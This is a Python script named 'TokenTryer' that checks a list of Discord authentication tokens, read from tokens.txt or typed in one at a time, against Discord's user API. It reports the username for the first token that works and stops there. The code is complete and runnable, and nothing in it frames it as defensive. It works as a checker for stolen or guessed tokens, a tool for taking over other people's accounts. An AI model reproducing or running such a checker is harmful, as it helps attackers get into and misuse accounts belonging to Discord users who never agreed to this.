import requests
import colorama
from colorama import Fore, Style
import os
import time
import webbrowser

# Initialize colorama for colored console output
colorama.init()

def clear_console():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """Display the TokenTryer banner with developer credit."""
    clear_console()
    banner = f"""
{Fore.CYAN}============================================================

████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗████████╗██████╗░██╗░░░██╗███████╗██████╗░
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║╚══██╔══╝██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║░░░██║░░░██████╔╝░╚████╔╝░█████╗░░██████╔╝
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║░░░██║░░░██╔══██╗░░╚██╔╝░░██╔══╝░░██╔══██╗
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║░░░██║░░░██║░░██║░░░██║░░░███████╗██║░░██║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
{Fore.YELLOW}Developed by: Ragoon821
{Fore.CYAN}============================================================{Style.RESET_ALL}
    """
    print(banner)

def load_tokens(file_path):
    """Load tokens from a text file and return them as a list."""
    try:
        with open(file_path, 'r') as file:
            tokens = [line.strip() for line in file if line.strip()]
        return tokens
    except FileNotFoundError:
        print(f"{Fore.RED}Error: File {file_path} not found.{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}Error reading file: {e}{Style.RESET_ALL}")
        return []

def check_token(token):
    """Check if a Discord token is valid by making an API request."""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            print(f"{Fore.GREEN}Valid token found! User: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0000')}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}Invalid token: {token[:10]}... (Status Code: {response.status_code}){Style.RESET_ALL}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error checking token {token[:10]}...: {e}{Style.RESET_ALL}")
        return False

def check_tokens_from_file():
    """Menu option to check tokens from tokens.txt."""
    file_path = 'tokens.txt'
    tokens = load_tokens(file_path)
    
    if not tokens:
        print(f"{Fore.YELLOW}No tokens loaded. Please check your file.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.YELLOW}Loaded {len(tokens)} tokens. Checking now...{Style.RESET_ALL}")
    time.sleep(1)
    
    for token in tokens:
        if check_token(token):
            print(f"{Fore.GREEN}Stopping script as a valid token was found.{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")
            return
        time.sleep(0.5)  # Small delay to avoid rate limiting
    else:
        print(f"{Fore.RED}No valid tokens found in the list.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")

def check_single_token():
    """Menu option to check a single token entered by the user."""
    token = input(f"{Fore.YELLOW}Enter the Discord token to check: {Style.RESET_ALL}")
    if not token.strip():
        print(f"{Fore.RED}Error: No token entered.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")
        return
    
    if check_token(token):
        print(f"{Fore.GREEN}Token is valid!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Token is invalid or an error occurred.{Style.RESET_ALL}")
    input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")

def open_github():
    """Menu option to open GitHub page for Ragoon821."""
    github_url = 'https://github.com/ragoon821'
    print(f"{Fore.YELLOW}Opening GitHub page for Ragoon821 in your default browser...{Style.RESET_ALL}")
    webbrowser.open(github_url)
    time.sleep(1)
    input(f"{Fore.CYAN}Press Enter to return to the menu...{Style.RESET_ALL}")

def display_menu():
    """Display the main menu and handle user input."""
    while True:
        display_banner()
        print(f"{Fore.YELLOW}Menu:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. Check Tokens from tokens.txt{Style.RESET_ALL}")
        print(f"{Fore.CYAN}2. Check a Single Token{Style.RESET_ALL}")
        print(f"{Fore.CYAN}3. Visit GitHub (Ragoon821){Style.RESET_ALL}")
        print(f"{Fore.CYAN}4. Exit{Style.RESET_ALL}")
        choice = input(f"{Fore.YELLOW}Enter your choice (1-4): {Style.RESET_ALL}")
        
        if choice == '1':
            check_tokens_from_file()
        elif choice == '2':
            check_single_token()
        elif choice == '3':
            open_github()
        elif choice == '4':
            print(f"{Fore.GREEN}Thank you for using TokenTryer by Ragoon821. Goodbye!{Style.RESET_ALL}")
            time.sleep(1)
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please select 1, 2, 3, or 4.{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def main():
    """Main function to start the application."""
    display_menu()

if __name__ == "__main__":
    main()